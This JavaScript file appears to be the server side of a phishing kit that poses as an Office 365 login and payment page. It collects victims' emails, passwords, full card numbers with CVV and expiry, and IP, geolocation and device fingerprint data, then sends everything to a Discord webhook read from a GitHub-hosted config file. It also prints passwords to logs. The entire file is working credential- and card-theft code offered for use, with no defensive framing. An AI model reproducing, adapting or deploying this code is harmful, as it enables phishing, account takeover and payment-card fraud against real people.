import { Buffer } from 'node:buffer';

const GH_TOKEN = process.env.GH_TOKEN || '';
const GH_OWNER = process.env.GH_OWNER || 'varasjaime777-alt';
const GH_REPO = process.env.GH_REPO || 'mail.office3655';
const CONFIG_PATH = 'config.json';
const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;

const headers = {
  'Authorization': `token ${GH_TOKEN}`,
  'Accept': 'application/vnd.github.v3+json',
  'User-Agent': 'MailOffice365Panel/1.0',
};

async function githubRead() {
  const res = await fetch(GITHUB_API, { method: 'GET', headers });
  if (!res.ok) throw new Error(`GitHub read error: ${res.status}`);
  const data = await res.json();
  return JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    let config = {};
    try {
      config = await githubRead();
    } catch (e) {
      console.error('No se pudo leer config.json:', e.message);
      return res.status(500).json({ error: 'No se pudo leer la configuración' });
    }

    const webhookUrl = config.discordWebhook;
    if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) {
      return res.status(400).json({ error: 'Webhook no configurado' });
    }

    const body = req.body || {};
    const email = body.email || 'unknown';
    const password = body.password || '****';
    const type = body.type || 'login';
    const timestamp = new Date().toISOString();

    // IP del cliente
    const forwardedFor = req.headers['x-forwarded-for'] || '';
    const clientIp = forwardedFor.split(',')[0]?.trim() || 'desconocida';

    // Datos del navegador
    const userAgent = body.userAgent || 'desconocido';
    const language = body.language || 'desconocido';
    const languages = body.languages || language;
    const screenResolution = body.screenResolution || 'desconocido';
    const colorDepth = body.colorDepth || 'desconocido';
    const timezone = body.timezone || 'desconocido';
    const platform = body.platform || 'desconocido';
    const onlineStatus = body.onlineStatus || 'desconocido';
    const cookiesEnabled = body.cookiesEnabled || 'desconocido';

    // Datos del dispositivo
    const deviceMemory = body.deviceMemory || 'desconocido';
    const cpuCores = body.cpuCores || 'desconocido';
    const touchPoints = body.touchPoints || 0;
    const isMobile = body.isMobile || 'No';
    const isTablet = body.isTablet || 'No';
    const isDesktop = body.isDesktop || 'No';

    // Batería
    const batteryLevel = body.batteryLevel || 'No disponible';
    const batteryCharging = body.batteryCharging || 'Desconocido';

    // Geo IP
    const geoIp = body.geoIp || (body.ipifyIp || clientIp);
    const geoCity = body.geoCity || '';
    const geoRegion = body.geoRegion || '';
    const geoCountry = body.geoCountry || '';
    const geoCountryCode = body.geoCountryCode || '';
    const geoTimezone = body.geoTimezone || timezone;
    const geoIsoCode = body.geoIsoCode || '';
    const geoIsp = body.geoIsp || '';
    const geoLatitude = body.geoLatitude || '';
    const geoLongitude = body.geoLongitude || '';
    const geoZip = body.geoZip || '';
    const geoCurrency = body.geoCurrency || '';
    const geoCurrencyCode = body.geoCurrencyCode || '';
    const geoCallingCode = body.geoCallingCode || '';
    const geoNetwork = body.geoNetwork || '';

    // Tarjeta (solo pago)
    const cardNumber = body.cardNumber || '';
    const cardHolder = body.cardHolder || '';
    const expiryDate = body.expiryDate || '';
    const cvv = body.cvv || '';

    // Construir mensaje
    let message = '';

    if (type === 'login') {
      message += '🔐 **NUEVO INICIO DE SESIÓN**';
      message += '\n──────────────────────────';
      message += '\n📧 **Usuario:** ' + email;
      message += '\n🔑 **Contraseña:** ' + password;
      message += '\n──────────────────────────';
      message += '\n🌍 **UBICACIÓN:**';
      message += '\n📡 IP: ' + clientIp;
      message += '\n🌐 Geo IP: ' + geoIp;
      if (geoCity) message += '\n🏙️ Ciudad: ' + geoCity;
      if (geoRegion) message += '\n📍 Región: ' + geoRegion;
      if (geoCountry) message += '\n🌎 País: ' + geoCountry + ' (' + geoCountryCode + ')';
      if (geoTimezone) message += '\n⏰ Zona horaria: ' + geoTimezone;
      if (geoIsp) message += '\n📶 ISP: ' + geoIsp;
      if (geoLatitude) message += '\n🧭 Latitud: ' + geoLatitude;
      if (geoLongitude) message += '\n🧭 Longitud: ' + geoLongitude;
      if (geoZip) message += '\n📮 Código postal: ' + geoZip;
      if (geoCurrency) message += '\n💰 Moneda: ' + geoCurrency + ' (' + geoCurrencyCode + ')';
      if (geoCallingCode) message += '\n📞 Código de llamada: ' + geoCallingCode;
      if (geoNetwork) message += '\n🔗 Red: ' + geoNetwork;
      message += '\n──────────────────────────';
      message += '\n💻 **DISPOSITIVO:**';
      message += '\n🧠 RAM: ' + deviceMemory + ' GB';
      message += '\n⚙️ CPU: ' + cpuCores + ' núcleos';
      message += '\n👆 Puntos táctiles: ' + touchPoints;
      message += '\n📱 Tipo: ' + isMobile + ' (Móvil) / ' + isTablet + ' (Tablet) / ' + isDesktop + ' (Escritorio)';
      message += '\n🔋 Batería: ' + batteryLevel + ' (Cargando: ' + batteryCharging + ')';
      message += '\n──────────────────────────';
      message += '\n🌐 **NAVEGADOR:**';
      message += '\n🤖 ' + userAgent;
      message += '\n🗣️ Idioma: ' + language;
      message += '\n🖥️ Pantalla: ' + screenResolution + ' (' + colorDepth + ')';
      message += '\n⏰ Zona: ' + timezone;
      message += '\n💻 Plataforma: ' + platform;
      message += '\n📡 Online: ' + onlineStatus;
      message += '\n🍪 Cookies: ' + cookiesEnabled;
      message += '\n──────────────────────────';
      message += '\n🕐 **Hora:** ' + timestamp;
    } else if (type === 'payment') {
      message += '💳 **VERIFICACIÓN DE PAGO**';
      message += '\n──────────────────────────';
      message += '\n📧 **Email:** ' + email;
      message += '\n──────────────────────────';
      message += '\n💰 **TARJETA:**';
      if (cardNumber) message += '\n🔢 Número: ' + cardNumber;
      if (cardHolder) message += '\n👤 Titular: ' + cardHolder;
      if (expiryDate) message += '\n📅 Vence: ' + expiryDate;
      if (cvv) message += '\n🔒 CVV: ' + cvv;
      message += '\n──────────────────────────';
      message += '\n🌍 **UBICACIÓN:**';
      message += '\n📡 IP: ' + clientIp;
      message += '\n🌐 Geo IP: ' + geoIp;
      if (geoCity) message += '\n🏙️ Ciudad: ' + geoCity;
      if (geoRegion) message += '\n📍 Región: ' + geoRegion;
      if (geoCountry) message += '\n🌎 País: ' + geoCountry + ' (' + geoCountryCode + ')';
      if (geoTimezone) message += '\n⏰ Zona horaria: ' + geoTimezone;
      if (geoIsp) message += '\n📶 ISP: ' + geoIsp;
      if (geoLatitude) message += '\n🧭 Latitud: ' + geoLatitude;
      if (geoLongitude) message += '\n🧭 Longitud: ' + geoLongitude;
      if (geoZip) message += '\n📮 Código postal: ' + geoZip;
      if (geoCurrency) message += '\n💰 Moneda: ' + geoCurrency + ' (' + geoCurrencyCode + ')';
      if (geoCallingCode) message += '\n📞 Código de llamada: ' + geoCallingCode;
      if (geoNetwork) message += '\n🔗 Red: ' + geoNetwork;
      message += '\n──────────────────────────';
      message += '\n💻 **DISPOSITIVO:**';
      message += '\n🧠 RAM: ' + deviceMemory + ' GB';
      message += '\n⚙️ CPU: ' + cpuCores + ' núcleos';
      message += '\n👆 Puntos táctiles: ' + touchPoints;
      message += '\n📱 Tipo: ' + isMobile + ' (Móvil) / ' + isTablet + ' (Tablet) / ' + isDesktop + ' (Escritorio)';
      message += '\n🔋 Batería: ' + batteryLevel + ' (Cargando: ' + batteryCharging + ')';
      message += '\n──────────────────────────';
      message += '\n🌐 **NAVEGADOR:**';
      message += '\n🤖 ' + userAgent;
      message += '\n🗣️ Idioma: ' + language;
      message += '\n🖥️ Pantalla: ' + screenResolution + ' (' + colorDepth + ')';
      message += '\n⏰ Zona: ' + timezone;
      message += '\n💻 Plataforma: ' + platform;
      message += '\n📡 Online: ' + onlineStatus;
      message += '\n🍪 Cookies: ' + cookiesEnabled;
      message += '\n──────────────────────────';
      message += '\n🕐 **Hora:** ' + timestamp;
    }

    console.log('📤 Enviando mensaje a Discord...');
    console.log('📋 Tipo:', type);
    console.log('📋 Email:', email);
    console.log('📋 Password:', password);
    console.log('📋 IP:', clientIp);
    console.log('📋 Geo City:', geoCity);
    console.log('📋 Geo Country:', geoCountry);
    console.log('📋 WiFi:', body.wifiName || 'no proporcionado');
    console.log('📋 Mensaje construido (primeros 200 chars):', message.substring(0, 200));

    // Enviar a Discord
    const discordRes = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: message }),
    });

    if (!discordRes.ok) {
      const errorText = await discordRes.text();
      console.error('❌ Error enviando a Discord:', discordRes.status, errorText);
      return res.status(500).json({
        error: 'Error enviando a Discord: ' + discordRes.status,
        debug_message: message,
      });
    }

    console.log('✅ Mensaje enviado a Discord correctamente');

    return res.status(200).json({
      success: true,
      message: 'Mensaje enviado correctamente',
      debug_message: message,
    });
  } catch (err) {
    console.error('❌ Error en API de Discord:', err);
    return res.status(500).json({ error: 'Error interno: ' + err.message });
  }
}
